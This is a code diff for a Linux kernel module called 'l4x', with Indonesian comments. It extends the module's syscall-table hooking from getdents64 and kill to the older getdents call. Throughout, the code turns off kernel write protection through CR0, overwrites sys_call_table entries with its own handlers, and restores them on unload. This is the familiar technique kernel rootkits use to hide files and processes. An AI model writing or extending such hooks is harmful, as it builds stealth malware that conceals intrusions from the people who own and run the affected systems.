@@ -26,11 +26,16 @@ static unsigned long *g_table;             /* alamat sys_call_table */
 typedef long (*l4x_fn_gd)(unsigned int, char __user *, unsigned int);
 typedef long (*l4x_fn_kill)(int, int);
 static l4x_fn_gd    g_orig_gd;
+static l4x_fn_gd    g_orig_getdents;
 static l4x_fn_kill g_orig_kill;
 
 long l4x_call_orig_getdents64(unsigned int fd, char __user *dirp, unsigned int count)
 {
 	return g_orig_gd(fd, dirp, count);
+}
+long l4x_call_orig_getdents(unsigned int fd, char __user *dirp, unsigned int count)
+{
+	return g_orig_getdents(fd, dirp, count);
 }
 long l4x_call_orig_kill(int pid, int sig)
 {
@@ -39,11 +44,16 @@ long l4x_call_orig_kill(int pid, int sig)
 #else
 typedef long (*l4x_fn_ptregs)(const struct pt_regs *);
 static l4x_fn_ptregs g_orig_getdents64;
+static l4x_fn_ptregs g_orig_getdents;
 static l4x_fn_ptregs g_orig_kill;
 
 long l4x_call_orig_getdents64(const struct pt_regs *regs)
 {
 	return g_orig_getdents64(regs);
+}
+long l4x_call_orig_getdents(const struct pt_regs *regs)
+{
+	return g_orig_getdents(regs);
 }
 long l4x_call_orig_kill(const struct pt_regs *regs)
 {
@@ -75,17 +85,19 @@ int l4x_hooks_init(void)
 	g_table = (unsigned long *)addr;
 
 #if L4X_OLD_ARGS
-	g_orig_gd    = (l4x_fn_gd)g_table[__NR_getdents64];
-	g_orig_kill  = (l4x_fn_kill)g_table[__NR_kill];
-	if (!g_orig_gd || !g_orig_kill) {
+	g_orig_gd       = (l4x_fn_gd)g_table[__NR_getdents64];
+	g_orig_getdents = (l4x_fn_gd)g_table[__NR_getdents];
+	g_orig_kill     = (l4x_fn_kill)g_table[__NR_kill];
+	if (!g_orig_gd || !g_orig_getdents || !g_orig_kill) {
 		pr_err("l4x: entri syscall asli tidak valid\n");
 		g_table = NULL;
 		return -ENOENT;
 	}
 #else
 	g_orig_getdents64 = (l4x_fn_ptregs)g_table[__NR_getdents64];
+	g_orig_getdents   = (l4x_fn_ptregs)g_table[__NR_getdents];
 	g_orig_kill       = (l4x_fn_ptregs)g_table[__NR_kill];
-	if (!g_orig_getdents64 || !g_orig_kill) {
+	if (!g_orig_getdents64 || !g_orig_getdents || !g_orig_kill) {
 		pr_err("l4x: entri syscall asli tidak valid\n");
 		g_table = NULL;
 		return -ENOENT;
@@ -95,12 +107,13 @@ int l4x_hooks_init(void)
 	preempt_disable();
 	cr0_wp_set(false);
 	g_table[__NR_getdents64] = (unsigned long)l4x_sys_getdents64;
+	g_table[__NR_getdents]   = (unsigned long)l4x_sys_getdents;
 	g_table[__NR_kill]       = (unsigned long)l4x_sys_kill;
 	cr0_wp_set(true);
 	preempt_enable();
 	asm volatile("" ::: "memory");   /* dorong perubahan ke TLB */
 
-	pr_info("l4x: sys_call_table dipasang (getdents64 + kill)\n");
+	pr_info("l4x: sys_call_table dipasang (getdents + getdents64 + kill)\n");
 	return 0;
 }
 
@@ -112,9 +125,11 @@ void l4x_hooks_exit(void)
 	cr0_wp_set(false);
 #if L4X_OLD_ARGS
 	g_table[__NR_getdents64] = (unsigned long)g_orig_gd;
+	g_table[__NR_getdents]   = (unsigned long)g_orig_getdents;
 	g_table[__NR_kill]       = (unsigned long)g_orig_kill;
 #else
 	g_table[__NR_getdents64] = (unsigned long)g_orig_getdents64;
+	g_table[__NR_getdents]   = (unsigned long)g_orig_getdents;
 	g_table[__NR_kill]       = (unsigned long)g_orig_kill;
 #endif
 	cr0_wp_set(true);
